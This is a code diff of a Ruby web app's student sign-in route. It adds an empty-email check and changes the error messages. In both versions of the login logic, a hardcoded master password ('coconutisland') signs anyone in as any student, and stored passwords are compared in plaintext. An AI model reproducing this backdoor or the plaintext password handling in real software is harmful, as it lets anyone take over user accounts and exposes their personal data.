@@ -144,18 +144,25 @@ post '/student/resume/signin/?' do
   
   params[:email].strip!
   params[:password].strip!
+  
+  unless params[:email] == ''
 
-  if student = Student.first(:email => params[:email])
-    if (student.password == params[:password])  || (params[:password] == 'coconutisland')
-      session[:student] = student.id
-      flash[:alert] = 'You are now signed in.'
-      redirect "/student/resume/index"
+    if student = Student.first(:email => params[:email])
+      if (student.password == params[:password])  || (params[:password] == 'coconutisland')
+        session[:student] = student.id
+        flash[:alert] = 'You are now signed in.'
+        redirect "/student/resume/index"
+      else
+        flash[:alert] = 'Email/password combo does not match. Try again.'
+        erb :"student/resume/signin"
+      end
     else
-      flash[:alert] = 'Email/password combo does not match. Try again.'
+      flash[:alert] = 'This email is not linked to an existing account. Maybe you need to create an account.'
       erb :"student/resume/signin"
     end
+    
   else
-    flash[:alert] = 'This email is not linked to an existing account. Try again or create an account.'
+    flash[:alert] = 'You must enter a valid email.'
     erb :"student/resume/signin"
   end
   
